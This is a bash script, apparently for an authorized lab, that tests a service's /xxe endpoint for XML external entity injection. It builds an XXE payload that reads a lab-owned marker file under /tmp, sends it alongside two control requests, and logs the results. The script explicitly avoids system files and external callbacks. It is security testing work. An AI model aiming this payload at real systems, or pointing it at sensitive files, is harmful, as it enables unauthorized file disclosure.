#!/usr/bin/env bash
set -Eeuo pipefail
TARGET="${TARGET:-http://<lab-ip>:18081}"
RUN_ID="modern_api_xxe_safe_marker_$(date -u +%Y%m%dT%H%M%SZ)"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
mkdir -p "$OUT/http" "$OUT/payload" "$OUT/control"
OBS="$OUT/observations.jsonl"
SUMMARY="$OUT/summary.md"
: > "$OBS"
json_obs(){ python3 - "$OBS" "$@" <<'PY'
import json,sys,datetime
p=sys.argv[1]
d={'ts':datetime.datetime.now(datetime.UTC).isoformat().replace('+00:00','Z')}
for a in sys.argv[2:]:
    if '=' in a:
        k,v=a.split('=',1); d[k]=v
open(p,'a',encoding='utf-8').write(json.dumps(d,ensure_ascii=False)+'\n')
PY
}
status(){ curl -sS -o "$2" -w '%{http_code}' --max-time 8 "$1" 2>/dev/null || echo 000; }
PRE=$(status "$TARGET/health" "$OUT/http/pre_health.json")
json_obs category=health name=pre status="$PRE" target="$TARGET"
cat > "$SUMMARY" <<EOF
# Modern API XXE Safe-Marker Wave 1

target: $TARGET
run_id: $RUN_ID
pre_health: $PRE
scope: authorized local lab only
vulnerability_class: XXE / CWE-611 / OWASP A05-style parser risk

EOF
XXE_FILE="/tmp/hermes_modern_api_xxe_marker.txt"
cat > "$OUT/payload/positive_xxe_marker.xml" <<XML
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://$XXE_FILE"> ]>
<data>&xxe;</data>
XML
cat > "$OUT/control/no_entity_control.xml" <<XML
<?xml version="1.0"?>
<data>CONTROL_NO_ENTITY</data>
XML
cat > "$OUT/control/wrong_file_control.xml" <<XML
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///tmp/hermes_modern_api_xxe_marker_wrong.txt"> ]>
<data>&xxe;</data>
XML
POS_BODY="$OUT/http/positive_response.json"
POS_CODE=$(curl -sS --max-time 10 -o "$POS_BODY" -w '%{http_code}' -H 'Content-Type: application/xml' --data-binary "@$OUT/payload/positive_xxe_marker.xml" "$TARGET/xxe" || echo 000)
NOENT_BODY="$OUT/http/no_entity_control_response.json"
NOENT_CODE=$(curl -sS --max-time 10 -o "$NOENT_BODY" -w '%{http_code}' -H 'Content-Type: application/xml' --data-binary "@$OUT/control/no_entity_control.xml" "$TARGET/xxe" || echo 000)
WRONG_BODY="$OUT/http/wrong_file_control_response.json"
WRONG_CODE=$(curl -sS --max-time 10 -o "$WRONG_BODY" -w '%{http_code}' -H 'Content-Type: application/xml' --data-binary "@$OUT/control/wrong_file_control.xml" "$TARGET/xxe" || echo 000)
read_json_field(){ python3 - "$1" "$2" <<'PY'
import json,sys
try: print(json.load(open(sys.argv[1],encoding='utf-8')).get(sys.argv[2],''))
except Exception: print('')
PY
}
POS_MARKER=$(read_json_field "$POS_BODY" xxe_marker)
NOENT_MARKER=$(read_json_field "$NOENT_BODY" xxe_marker)
WRONG_MARKER=$(read_json_field "$WRONG_BODY" xxe_marker)
POS_HIT=no; [ "$POS_MARKER" = "XXE_SAFE_MARKER_HERMES_LOCAL_LAB" ] && POS_HIT=yes
CONTROL_OK=no; [ -z "$NOENT_MARKER" ] && [ -z "$WRONG_MARKER" ] && CONTROL_OK=yes
json_obs category=xxe_positive status="$POS_CODE" marker_found="$POS_HIT" marker="$POS_MARKER" request="$OUT/payload/positive_xxe_marker.xml" response="$POS_BODY"
json_obs category=xxe_control name=no_entity status="$NOENT_CODE" marker="$NOENT_MARKER" request="$OUT/control/no_entity_control.xml" response="$NOENT_BODY"
json_obs category=xxe_control name=wrong_file status="$WRONG_CODE" marker="$WRONG_MARKER" request="$OUT/control/wrong_file_control.xml" response="$WRONG_BODY"
POST=$(status "$TARGET/health" "$OUT/http/post_health.json")
json_obs category=health name=post status="$POST" target="$TARGET"
VERDICT=attempted_not_verified
if [ "$PRE" = "200" ] && [ "$POST" = "200" ] && [ "$POS_CODE" = "200" ] && [ "$POS_HIT" = "yes" ] && [ "$CONTROL_OK" = "yes" ]; then
  VERDICT=verified_impact_lab_only
fi
{
  echo "## Results"
  echo "positive_status: $POS_CODE"
  echo "positive_marker_found: $POS_HIT"
  echo "positive_marker: $POS_MARKER"
  echo "no_entity_control_status: $NOENT_CODE"
  echo "no_entity_control_marker: $NOENT_MARKER"
  echo "wrong_file_control_status: $WRONG_CODE"
  echo "wrong_file_control_marker: $WRONG_MARKER"
  echo "controls_ok: $CONTROL_OK"
  echo "post_health: $POST"
  echo "verdict: $VERDICT"
  echo
  echo "## Boundaries"
  echo "Only the lab-owned marker file $XXE_FILE is requested; no /etc/passwd, cloud metadata, external callback, secrets, or public target."
  echo
  echo "## Artifact map"
  echo "positive_request: $OUT/payload/positive_xxe_marker.xml"
  echo "positive_response: $POS_BODY"
  echo "controls: $OUT/control/"
  echo "observations: $OBS"
} >> "$SUMMARY"
echo "$OUT"
